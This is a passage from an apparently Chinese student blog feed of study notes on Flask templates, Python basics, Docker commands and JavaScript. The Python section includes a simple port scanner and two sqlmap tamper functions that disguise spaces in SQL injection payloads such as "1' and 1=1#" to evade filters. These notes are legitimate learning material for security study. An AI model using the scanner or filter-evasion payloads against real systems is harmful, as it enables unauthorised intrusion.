<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#统计评论条数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">comment = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'pz1o'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'lzy'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,comments=comment)</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;评论数:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> i <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;a href="#"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">            &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<h3 id="继承和block"><a href="#继承和block" class="headerlink" title="继承和block"></a>继承和block</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python中的继承</span><br><span class="line">class Person(object):</span><br><span class="line">	name &#x3D; &#39;pz1o&#39;</span><br><span class="line">	age &#x3D; 18</span><br><span class="line">class Student(Person):</span><br><span class="line">	pass</span><br></pre></td></tr></table></figure>
<p>继承作用和语法：</p>
<ul>
<li><p>作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码。</p>
</li>
<li><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#39;base.html&#39;%&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>block实现：</p>
<ul>
<li>作用：可以让子模板实现一些自己的需求。父模板需要提前定义好。</li>
<li>注意点：子模板中的代码，必须放在block块中。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% block main %&#125;</span><br><span class="line">    &lt;h1&gt;这是首页&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python开发"><a href="#python开发" class="headerlink" title="python开发"></a>python开发</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">print(<span class="string">'hello pz1o'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux下执行</span></span><br><span class="line">chmod <span class="number">777</span> python</span><br><span class="line">./a.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#优化生成pyo</span></span><br><span class="line">python -O -m py_compile a.py</span><br><span class="line">python a.pyo</span><br><span class="line"></span><br><span class="line"><span class="comment">#eval</span></span><br><span class="line">a = <span class="string">'[1,2,3]'</span></span><br><span class="line">b = eval(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%格式化字符串</span></span><br><span class="line"><span class="comment">#%c:ascii</span></span><br><span class="line">a = <span class="number">97</span></span><br><span class="line">print(<span class="string">'i am %c'</span>%a)</span><br><span class="line"><span class="comment">#%x:16进制</span></span><br><span class="line">print(<span class="string">'i am %x'</span>%a)</span><br><span class="line"><span class="comment">#%o:8进制</span></span><br><span class="line">print(<span class="string">'i am %o'</span>%a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#日期</span></span><br><span class="line">time = time.time()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#args处理多余参数 args处理列表和元组 kwargs处理字典</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(num1,num2,*args,**kwargs)</span>:</span></span><br><span class="line">  print(num1-num2)</span><br><span class="line">  print(args)</span><br><span class="line">  print(kwargs)</span><br><span class="line">a = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">sub(*a)</span><br><span class="line"><span class="number">2</span>  (<span class="number">2</span>,)  &#123;&#125;</span><br><span class="line">sub(<span class="number">5</span>,<span class="number">3</span>,x=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span>  ()  &#123;<span class="string">'x'</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line"><span class="comment">#r只读  </span></span><br><span class="line"><span class="comment">#w写入  删除原文件，重新写入，无则创建</span></span><br><span class="line"><span class="comment">#a写入 文件末尾追加新的内容，无则创建</span></span><br><span class="line"><span class="comment">#a+读写  文件末尾追加新的内容，无则创建</span></span><br><span class="line"><span class="comment">#b 打开二进制文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'yyds.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br><span class="line">CUMTCTF&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line">		f.seek(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">  	print(f.read())</span><br><span class="line">&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line"><span class="comment">#f.seek('偏移量','选项')</span></span><br><span class="line"><span class="comment">#选项为0时，从文件头部向后偏移</span></span><br><span class="line"><span class="comment">#选项为1时，从当前位置偏移</span></span><br><span class="line"><span class="comment">#选项为2时，从文件末向前偏移</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#os模块</span></span><br><span class="line">os.mkdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.rmdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.listdir(<span class="string">'./'</span>)</span><br><span class="line">os.getcwd()</span><br><span class="line">os.chdir(<span class="string">'../'</span>)  <span class="comment">#改变当前工作目录</span></span><br><span class="line">os.system(<span class="string">'dir'</span>)  <span class="comment">#返回状态,0为成功,1为失败</span></span><br><span class="line">res = os.popen(<span class="string">'dir'</span>)  <span class="comment">#返回一个对象</span></span><br><span class="line">print(res.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#捕捉异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  正常代码</span><br><span class="line"><span class="keyword">except</span> 错误:</span><br><span class="line">  如果出现错误，执行这段代码</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  最终执行这段代码</span><br><span class="line">  </span><br><span class="line"><span class="comment">#网络编程</span></span><br><span class="line"><span class="comment">#非常简易的扫描器</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">443</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">3389</span>]</span><br><span class="line">allports = [<span class="number">0</span>,<span class="number">65535</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip,port,*args,**kwargs)</span>:</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is open"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is closed"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ports</span><span class="params">(ip,port)</span>:</span><span class="comment">#search some incoming specific parameters</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> port:</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(array)</span>:</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> array:</span><br><span class="line">        a.append(int(x))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portsplus</span><span class="params">(ip,port)</span>:</span><span class="comment">#search the parameters of an interval passed in</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(port[<span class="number">0</span>],port[<span class="number">1</span>]+<span class="number">1</span>):</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]You can read the following rules to use this tool.</span></span><br><span class="line"><span class="string">[+]python scanport.py host ports</span></span><br><span class="line"><span class="string">[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80,90,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80-90</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 all</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">            ports(sys.argv[<span class="number">1</span>],port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">','</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">','</span>)</span><br><span class="line">                ports(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'-'</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">'-'</span>)</span><br><span class="line">                portsplus(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> sys.argv[<span class="number">2</span>] == <span class="string">'all'</span>:</span><br><span class="line">                portsplus(ip,allports)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">                scan(ip,port)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]There is something wrong!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]The task has been completed!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#类和对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    __age = <span class="number">18</span> <span class="comment">#私有属性</span></span><br><span class="line">    name = <span class="string">'name'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.name = name;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"my name is %s,and my age is %d"</span>%((self.name),(self.__age)))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hello</span><span class="params">(self)</span>:</span><span class="comment">#私有方法</span></span><br><span class="line">        print(<span class="string">"Hello!! My name is %s"</span>%(self.name))</span><br><span class="line"></span><br><span class="line">pz1o = Person(<span class="string">'pz1o'</span>)</span><br><span class="line">pz1o.introduce()<span class="comment">#公有方法调用</span></span><br><span class="line">print(pz1o._Person__age)<span class="comment">#私有属性调用</span></span><br><span class="line">pz1o._Person__hello()<span class="comment">#私有方法调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tamper编写</span></span><br><span class="line">--tamper scan.py</span><br><span class="line"><span class="comment">#绕空格</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x.isspace():</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' and 1=1#"</span>))</span><br><span class="line"><span class="comment">#不过滤引号里的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">"'"</span> <span class="keyword">or</span> x == <span class="string">'"'</span>:</span><br><span class="line">                flag = <span class="keyword">not</span> flag</span><br><span class="line">                retVal += <span class="string">"'"</span></span><br><span class="line">            <span class="keyword">elif</span> x.isspace() <span class="keyword">and</span> <span class="keyword">not</span> flag:</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' my name is pz1o' and 1=1#"</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习</title>
    <url>/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>白嫖的阿里云服务器不能浪费了，来学习一下docker,只记录一下重要的。</p>
<p>b站学习资源<a href="https://www.bilibili.com/video/BV1og4y1q7M4?" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1og4y1q7M4?</a></p>
<h1 id="Docker基础"><a href="#Docker基础" class="headerlink" title="Docker基础"></a>Docker基础</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812213743035.png" alt="image-20200812213743035"></p>
<p>镜像（ Image ） ：Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 </p>
<p>容器（ Container ） ：镜像（ Image ）和容器（ Container ）的关系，就像是面向对象程序设计中的 类 和实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>仓库（ Repository ）：一个 <strong>Docker Registry</strong> 中可以包含多个仓库（ Repository ）；每个仓库可以包含多个标签（ Tag ）；每个标签对应一个镜像。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//1.卸载旧版本</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                   docker-client \</span><br><span class="line">                   docker-client-latest \</span><br><span class="line">                   docker-common \</span><br><span class="line">                   docker-latest \</span><br><span class="line">                   docker-latest-logrotate \</span><br><span class="line">                   docker-logrotate \</span><br><span class="line">                   docker-engine</span><br><span class="line"></span><br><span class="line">//2.需要安装安装包</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">//3.设置镜像仓库</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">//4.更新yum</span><br><span class="line">yum makecache fast</span><br><span class="line">//5.安装docker</span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line">一直y</span><br><span class="line">//6.启动docker</span><br><span class="line">systemctl start docker</span><br><span class="line">//7.测试docker</span><br><span class="line">docker version </span><br><span class="line">docker run hello-world</span><br><span class="line">//8.docker镜像</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812224856499.png" alt="image-20200812224856499"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;卸载docker</span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line">rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker docker 默认工作路径</span><br></pre></td></tr></table></figure>
<p><strong>run的流程</strong></p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813152655350.png" alt="image-20200813152655350"></p>
<h2 id="Docker与vm"><a href="#Docker与vm" class="headerlink" title="Docker与vm"></a>Docker与vm</h2><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程。<strong>容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。</strong>因此容器要比传统虚拟机更为轻便。</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153605377.png" alt="image-20200813153605377"></p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153615560.png" alt="image-20200813153615560"></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker version  &#x2F;&#x2F;版本信息</span><br><span class="line">docker info  &#x2F;&#x2F;系统信息</span><br></pre></td></tr></table></figure>
<p>文档：<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p>
<p><strong>镜像命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images -a  //列出所有镜像</span><br><span class="line">dokcer images -q  //只显示id</span><br><span class="line"><span class="meta">[root@/]#</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY(镜像的仓库源)          TAG(标签)                 IMAGE ID(镜像的id)            CREATED(创建时间)             SIZE(大小)</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"></span><br><span class="line">docker search  mysql  //搜索镜像</span><br><span class="line">dokcer pull mysql[:tag]  //下载镜像</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line">docker rmi -f id  //删除镜像</span><br><span class="line">docker rmi -f $(docker images -aq)  //删除全部镜像</span><br></pre></td></tr></table></figure>
<p><strong>容器命令</strong></p>
<p>==有镜像才可以创建容器，先安装一个centos==</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull centos</span><br><span class="line">docker run [参数] image  //新建容器并启动</span><br><span class="line">--name="name1"  //容器名字</span><br><span class="line">-d  //后台运行</span><br><span class="line">-P  //随机把容器的端口映射到一个主机未使用的高端口</span><br><span class="line">-i  //以交互模式运行容器，常与-t连用</span><br><span class="line">-t  //为容器重新分配一个伪输入终端，常与-i连用</span><br><span class="line">-it  //交互方式运行</span><br><span class="line">-p ip：主机端口：容器端口  //指定容器端口</span><br><span class="line"></span><br><span class="line">docker ps //正在运行的容器</span><br><span class="line">docker ps -a  //历史运行的容器</span><br><span class="line">docker rm 容器id  //删除容器</span><br><span class="line">docker rm -f $(docker ps -aq)  //删除所有容器</span><br><span class="line">docker start 容器id  //启动容器</span><br><span class="line">docker restart 容器id  //重启容器</span><br><span class="line">docker stop 容器id  //停止容器</span><br><span class="line">docker kill 容器id  //杀死容器</span><br><span class="line"></span><br><span class="line">//进入容器</span><br><span class="line">docker run -it centos /bin/bash</span><br><span class="line">//退出容器</span><br><span class="line">exit  停止退出</span><br><span class="line">ctrl+p+q  不停止退出</span><br></pre></td></tr></table></figure>
<h2 id="从github复现CTF"><a href="#从github复现CTF" class="headerlink" title="从github复现CTF"></a>从github复现CTF</h2><p>首先从github上clone下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone xxx</span><br></pre></td></tr></table></figure>
<p>若有docker.yml直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">docker ps #查看端口号</span><br></pre></td></tr></table></figure>
<p>如果有dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入dockerfile目录</span><br><span class="line">设置权限</span><br><span class="line">docker build -t &#39;自定义镜像名称&#39; .(最后有一个点)</span><br><span class="line">docker run --name&#x3D;&#39;自定义容器名称&#39; -i -d -P 镜像名称 &#x2F;run.sh</span><br><span class="line">docker ps &#x2F;&#x2F;查看端口号</span><br></pre></td></tr></table></figure>
<p>查看端口号</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151417590.png" alt="image-20201006151417590"></p>
<p>部署完成</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151456458.png" alt="image-20201006151456458"></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript学习</title>
    <url>/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>参考廖雪峰教程<a href="https://www.liaoxuefeng.com/wiki/1022910821149312" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1022910821149312</a></p>
<h1 id="入门javascript"><a href="#入门javascript" class="headerlink" title="入门javascript"></a>入门javascript</h1><h2 id="引入javascript"><a href="#引入javascript" class="headerlink" title="引入javascript"></a>引入javascript</h2><p><strong>内部标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	/...</span><br><span class="line">	..</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>外部引入</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./.."</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 变量</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 条件控制</span></span><br><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">..</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(num)</span></span><br></pre></td></tr></table></figure>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><strong>变量</strong></p>
<p>变量名是大小写英文、数字、<code>$</code>和<code>_</code>的组合，且不能用数字开头</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> $<span class="number">1</span> = <span class="string">"a"</span>;</span><br></pre></td></tr></table></figure>
<p><strong>数字</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">123</span> <span class="comment">//整数</span></span><br><span class="line"><span class="number">123.1</span> <span class="comment">//浮点数</span></span><br><span class="line"><span class="number">1.1e1</span> <span class="comment">//科学计数法</span></span><br><span class="line"><span class="literal">NaN</span>  <span class="comment">//not a number</span></span><br><span class="line"><span class="string">'abc'</span> <span class="comment">//字符串</span></span><br><span class="line"><span class="literal">true</span> <span class="comment">//布尔值</span></span><br></pre></td></tr></table></figure>
<p><strong>比较运算符</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">=</span><br><span class="line">== 等于（类型不一样，值一样）</span><br><span class="line">===  绝对等于（类型一样，值一样）</span><br></pre></td></tr></table></figure>
<ol>
<li>NaN===NaN是false，它与任何值都不相等，包括自己。</li>
<li>isNaN（NaN）会返回true。</li>
</ol>
<p><strong>数组</strong></p>
<blockquote>
<p>中括号</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"hello"</span>]</span><br></pre></td></tr></table></figure>
<p><strong>对象</strong></p>
<blockquote>
<p>大括号,每个属性用逗号隔开，最后不需要</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">		name: <span class="string">"111"</span>,</span><br><span class="line">		age: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.name</span><br><span class="line">&gt;<span class="number">111</span></span><br><span class="line">person.age</span><br><span class="line">&gt;<span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="strict模式"><a href="#strict模式" class="headerlink" title="strict模式"></a><strong>strict模式</strong></h3><p>在同一个页面的不同的JavaScript文件中，如果都不用<code>var</code>申明，恰好都使用了变量<code>i</code>，将造成变量<code>i</code>互相影响，产生难以调试的错误结果。</p>
<p>使用<code>var</code>申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内（函数的概念将稍后讲解），同名变量在不同的函数体内互不冲突。</p>
<p>为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过<code>var</code>申明变量，未使用<code>var</code>申明变量就使用的，将导致运行错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line">abc = <span class="string">""</span>hello world<span class="string">";</span></span><br><span class="line"><span class="string">//使用strict模式上面代码会报错</span></span><br><span class="line"><span class="string">var abc = "</span>hello world<span class="string">";</span></span><br></pre></td></tr></table></figure>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//转义字符</span></span><br><span class="line">\n</span><br><span class="line">\t</span><br><span class="line"><span class="string">'\x41'</span>; <span class="comment">// 完全等同于 'A'</span></span><br><span class="line"><span class="string">'\u4e2d\u6587'</span>; <span class="comment">// 完全等同于 '中文'</span></span><br></pre></td></tr></table></figure>
<h3 id="多行字符串"><a href="#多行字符串" class="headerlink" title="多行字符串"></a><strong>多行字符串</strong></h3><p>由于多行字符串用<code>\n</code>写起来比较费事，所以最新的ES6标准新增了一种多行字符串的表示方法，用反引号 ``表示</p>
<h3 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a><strong>模板字符串</strong></h3><p>要把多个字符串连接起来,可以用<code>+</code>也可以用<code>`${..}</code>表示</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//+号</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span>+name);</span><br><span class="line"><span class="comment">//$&#123;&#125;</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`123<span class="subst">$&#123;name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
<p><strong>操作字符串</strong></p>
<blockquote>
<p>字符串是不可改变的，无论之后赋值，都不会改变。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(s.length); <span class="comment">//长度</span></span><br><span class="line"><span class="built_in">console</span>.log(s[<span class="number">0</span>]); <span class="comment">//输出</span></span><br></pre></td></tr></table></figure>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>JavaScript的<code>Array</code>可以包含任意数据类型，并通过索引来访问每个元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.length;</span><br><span class="line">arr.length = <span class="number">6</span>; <span class="comment">//可以通过给length赋值，改变数组的大小</span></span><br></pre></td></tr></table></figure>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。</p>
